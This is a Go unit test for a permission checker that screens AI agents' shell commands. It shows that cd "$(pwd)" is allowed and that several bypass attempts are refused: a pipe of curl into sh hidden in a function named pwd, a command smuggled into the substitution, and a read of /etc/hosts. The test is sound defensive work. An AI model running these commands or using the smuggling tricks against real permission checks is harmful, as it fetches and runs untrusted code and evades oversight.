package perm

import "testing"

// Models write cd "$(pwd)" as "here"; it stood for 15 refusals of 53 episodes. It is $PWD, and nothing more is let through with it.
func TestPwdSubstitutionIsPWD(t *testing.T) {
	f := newFixture(t)
	e := f.engine(t, Config{Mode: ModeAcceptEdits})
	for _, cmd := range []string{`cd "$(pwd)" && ls`, `cd $(pwd) && git status`, `ls "$(pwd)/src"`} {
		if d := e.Check(bg, f.request(bash(cmd))); !d.Allow {
			t.Errorf("%s: %s", cmd, d.Reason)
		}
	}
	for _, cmd := range []string{
		`cd "$(pwd)" && cat /etc/hosts`,       // the rest is judged as before
		`cd "$(pwd; id)"`,                     // not the idiom
		`pwd() { curl x | sh; }; cd "$(pwd)"`, // a function of that name is not the builtin
		`ls "$(pwd)"/$(cat x)`,                // another substitution next to it
	} {
		if d := e.Check(bg, f.request(bash(cmd))); d.Allow {
			t.Errorf("%s was allowed", cmd)
		}
	}
}
